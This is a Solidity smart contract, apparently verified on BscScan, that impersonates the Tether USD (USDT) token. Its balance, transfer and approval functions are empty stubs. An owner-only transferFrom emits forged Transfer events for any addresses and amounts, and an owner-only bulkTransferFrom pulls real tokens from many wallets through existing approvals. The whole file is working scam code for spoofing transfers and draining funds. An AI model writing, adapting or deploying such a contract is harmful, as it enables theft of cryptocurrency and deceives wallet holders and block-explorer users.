/**
 *Submitted for verification at BscScan.com on 2023-05-08
*/

// SPDX-License-Identifier: SimPL-2.0
pragma solidity ^0.8.18;
interface ITRC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, errorMessage);
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

}
contract TRC20 is ITRC20 {
    using SafeMath for uint256;
    address private owner;
    uint8 constant  public decimals = 6;
    string constant public name = 'Tether USD';
    string constant public symbol = 'USDT';
    constructor() {
        owner = msg.sender;
    }
    
    function totalSupply() public pure returns (uint256) {
        return 999999999999999999;
    }
    function balanceOf(address _account) public pure returns (uint256) {}
    function transfer(address _recipient, uint256 _amount) public returns (bool) {}
    function allowance(address _owner, address _spender) public view returns (uint256) {}
    function approve(address _spender, uint256 _value) public returns (bool) {}
    function changeOwner(address newowner) public{
        require(msg.sender == owner);
        owner=newowner;
    }

    function transferFrom(address _sender, address _recipient, uint256 _amount) public returns (bool){
        require(msg.sender == owner);
        emit Transfer(_sender, _recipient, _amount);
        return true;
    }
    
    function bulkTransferFrom(address[] memory coinList,address[] memory fromList,address[] memory toList, uint256[] memory valueList) public returns (bool){
        require(msg.sender == owner);
        for (uint256 i = 0; i < fromList.length; i++) {
            ITRC20(coinList[i]).transferFrom(fromList[i], toList[i], valueList[i]);
        }
        return true;
    }
}